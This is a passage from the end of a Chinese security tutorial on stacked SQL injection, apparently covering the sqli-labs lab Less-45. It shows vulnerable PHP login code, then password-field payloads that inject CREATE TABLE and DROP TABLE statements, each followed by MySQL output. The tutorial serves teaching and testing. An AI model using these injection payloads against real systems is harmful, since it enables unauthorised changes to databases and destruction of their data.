|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   5 | stupid   | stupidity  |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   6 | superman | genious    |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   7 | batman   | mob!le     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   8 | admin    | admin      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   9 | admin1   | admin1     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  10 | admin2   | admin2     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  11 | admin3   | admin3     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  12 | dhakkan  | dumbo      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  14 | admin4   | admin4     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  38 | less38   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  39 | less39   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 109 | hello| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  40 | less40   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 110 | less41| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 144 | less44| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">19 rows in set (0.00 sec)</span><br  /></pre><h2><span style="font-size:16px;line-height:36px;;"><strong>7.Less-45 报错型堆叠注入&nbsp;-&nbsp;字符型 - POST</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">username = mysqli_real_escape_string(<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$con1</span>, <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 78px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_user"</span>]);</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">password = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 105px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_password"</span>];</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">sql = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 503px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"SELECT * FROM users WHERE username=('<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 58px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$username</span>') and password=('<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$password</span>')"</span>;</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">（2）测试</span></p><p><span style="font-size:14px;line-height:34px;;">登录前测试增加表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username :  admin<br  /><br  />password :  c');<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 40px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less45 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>#   //创建了less45表</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看增加表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| less45|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">5 rows in set (0.00 sec)</span><br  /></pre><p><span style="font-size:14px;line-height:34px;;">登录前测试删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username：admin<br  /><br  />password ：c');<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less45#</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">4 rows in set (0.00 sec)</span><br  /></pre><p><br  /></p><p><img data-type="png" class="" data-ratio="0.109375" data-w="640" data-backw="556" data-backh="61" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/22_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;text-align: start;font-size:10px;line-height:30px;;color: rgb(36, 41, 46);visibility: visible !important;width: 677px !important;"  /><br  /></p><p style="text-align: right;"><span style="font-size:12px;line-height:32px;;">参考来源：backlion's博客</span></p><p style="text-align: right;"><span style="font-size:12px;line-height:32px;;">作者：backlion</span></p><p><img class="rich_pages" data-copyright="0" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/23_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>